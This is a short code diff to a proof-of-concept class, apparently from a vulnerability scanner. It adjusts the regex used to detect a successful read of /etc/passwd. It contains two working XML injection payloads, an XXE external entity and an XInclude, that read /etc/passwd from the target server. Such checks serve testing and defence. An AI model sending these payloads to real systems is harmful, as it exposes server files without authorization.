@@ -46,10 +46,10 @@ class POC():
             payloads = [
                 (
                 '''<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY content SYSTEM "file:///etc/passwd">]><a>&content;</a>''',
-                b"root:[x\*]:0:0:"),
+                b"root:[x*]:0:0:"),
                 (
                 '''<?xml version="1.0" ?><root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></root>''',
-                b"root:[x\*]:0:0:")
+                b"root:[x*]:0:0:")
             ]
             for payload, show in payloads:
                 req = self.parser.generaterequest({"data":payload})
